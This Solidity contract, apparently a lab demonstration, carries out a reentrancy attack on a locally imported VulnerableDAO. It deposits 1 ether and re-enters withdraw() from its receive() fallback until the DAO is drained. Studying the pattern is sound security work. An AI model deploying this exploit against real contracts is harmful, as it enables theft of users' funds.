// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableDAO.sol";

contract ReentrancyAttack
{
    VulnerableDAO public vulnerableDAO;

    constructor(address _vulnerableDAOAddress)
    {
        vulnerableDAO = VulnerableDAO(_vulnerableDAOAddress);
    }

    receive() external payable
    {
        if (address(vulnerableDAO).balance >= 1 ether) 
        {
            vulnerableDAO.withdraw();
        }
    }

    function attack() external payable
    {
        require(msg.value == 1 ether, "Require 1 Ether to attack");

        vulnerableDAO.deposit{value: msg.value}();
        vulnerableDAO.withdraw();
    }
 

    function getBalance() public view returns (uint256)
    {
        return address(this).balance;
    }
}